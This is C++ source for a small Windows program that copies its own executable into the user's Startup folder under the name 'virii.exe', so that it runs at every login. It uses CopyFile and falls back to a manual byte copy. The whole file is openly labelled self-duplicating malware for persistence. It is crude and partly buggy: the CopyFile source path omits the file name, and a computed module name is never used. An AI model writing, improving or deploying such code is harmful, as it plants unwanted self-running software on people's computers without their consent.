#include <Windows.h>
#include <dirent.h>
#include <shlobj.h>
#include <fcntl.h>
#include <psapi.h>
#include <string>

TCHAR *my_strcat(TCHAR *dest, const TCHAR *src)
{
    size_t i, j;
    for (j = 0 ; j[dest] != '\0'; j++);
    for (i = 0 ; i[src] != '\0'; i++) dest[j + i] = i[src];
    dest[j + i] = '\0';
    return dest;
}

bool has_suffix(const std::string& s, const std::string& suffix) {
    return (s.size() >= suffix.size()) && equal(suffix.rbegin(), suffix.rend(), s.rbegin());
}

TCHAR path_s[512];
char buff[512];
int source, target, byt;

std::string ExeName() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

void self_duplicating(int a)
{
    std::string exename = ExeName();
    source = open(exename.c_str(), O_RDONLY|O_BINARY);
    target = open(path_s, O_CREAT|O_BINARY|O_WRONLY);
    while(1) {
        byt = read(source, buff, 512);
        if (byt > 0) write(target, buff, byt);
        else break;
    }
    close(source);
    close(target);
}

void self_duplicating()
{
    TCHAR cdir[512];
    TCHAR BaseName[MAX_PATH];
    TCHAR *backslash = (TCHAR*)"\\";
    DWORD dwProcessId = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL != hProcess) {
        GetModuleBaseName(hProcess, NULL, BaseName, _countof(BaseName));
        CloseHandle(hProcess);
    }
    GetCurrentDirectory(255, cdir);
    my_strcat(cdir, backslash);
    if (CopyFile(cdir, path_s, FALSE) == FALSE) self_duplicating(1);
}

int main()
{
    TCHAR *s = (TCHAR*)"\\virii.exe";
    if (SHGetSpecialFolderPath(NULL, path_s, CSIDL_STARTUP, 0) == TRUE) my_strcat(path_s, s);
    HANDLE hFile = CreateFile(
        path_s, GENERIC_READ | GENERIC_WRITE, 0, NULL,
        CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
    );
    CloseHandle(hFile);
    self_duplicating();
    return 0;
}